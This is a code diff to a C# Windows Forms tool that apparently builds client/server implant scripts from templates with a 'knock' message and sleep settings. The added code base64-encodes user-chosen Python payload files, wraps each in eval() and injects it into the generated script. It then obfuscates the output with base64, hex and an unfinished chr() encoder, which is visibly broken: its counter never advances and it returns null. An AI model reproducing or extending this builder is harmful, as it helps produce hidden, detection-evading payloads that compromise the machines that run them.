@@ -43,6 +43,9 @@ namespace Reception
 
             //PROTECTION
 
+            //LOGS
+            textBox4.Enabled = checkBox2.Checked && !checkBox3.Checked;
+
             //KEY EXCHANGE
 
             //PAYLOAD
@@ -116,6 +119,39 @@ namespace Reception
             return _code;
         }
 
+        //TODO: FINISH THIS CODE
+        private string ProtectChr(string code)
+        {
+            List<int> tmp = new List<int>();
+            foreach (string line in code.Split(new string[] { Environment.NewLine }, StringSplitOptions.None))
+            {
+                foreach (char c in line)
+                {
+                    int ascii = (int)c;
+                    tmp.Add(ascii);
+                }
+            }
+
+            int width = 20;
+            int i = 0;
+            StringBuilder sb = new StringBuilder();
+            StringBuilder new_code = new StringBuilder();
+            foreach (int ascii in tmp)
+            {
+                if (i == width - 1)
+                {
+                    sb.Append($@"chr({ascii})");
+                    i = 0;
+                }
+                else
+                {
+                    sb.Append($@"chr({ascii})+");
+                }
+            }
+
+            return null;
+        }
+
         private void build()
         {
             string file = code_path[radioButton1.Checked ? "client" : "server"];
@@ -127,7 +163,28 @@ namespace Reception
             code = code.Replace("[KNOCK_MSG]", textBox3.Text);
             code = code.Replace("[SLEEP]", numericUpDown3.Value.ToString());
 
+            //LOGS
+            if (checkBox2.Checked)
+            {
+
+            }
+
+            //ADD PAYLOAD
+            StringBuilder sb_payload = new StringBuilder();
+            foreach (ListViewItem item in listView1.CheckedItems)
+            {
+                string py_file = item.Tag.ToString();
+                if (!File.Exists(py_file))
+                    continue;
+
+                string _code = File.ReadAllText(py_file);
+                sb_payload.Append($"eval('{C1.StrE2B64Str(_code)}')\n");
+            }
+            code = code.Replace("'[PAYLOAD]'", sb_payload.ToString());
+            sb_payload.Clear();
+
             //PROTECTION
+            //THIS FUNCTION SHOULD BE USE AT LAST.
             if (checkBox1.Checked) code = ProtectB64(code);
             if (checkBox5.Checked) code = ProtectHex(code);
 
@@ -137,13 +194,6 @@ namespace Reception
             {
                 File.WriteAllText(sfd.FileName, code);
                 MessageBox.Show("Save file: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            }
-
-            //ADD PAYLOAD
-            foreach (ListViewItem item in listView1.CheckedItems)
-            {
-                string py_file = item.Tag.ToString();
-                string _code = File.ReadAllText(py_file);
             }
         }
 
@@ -171,6 +221,21 @@ namespace Reception
         private void textBox4_TextChanged(object sender, EventArgs e)
         {
 
+        }
+
+        private void label6_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void checkBox2_CheckedChanged(object sender, EventArgs e)
+        {
+            textBox4.Enabled = checkBox2.Checked && !checkBox3.Checked;
+        }
+
+        private void checkBox3_CheckedChanged(object sender, EventArgs e)
+        {
+            textBox4.Enabled =  checkBox2.Checked && !checkBox3.Checked;
         }
     }
 }
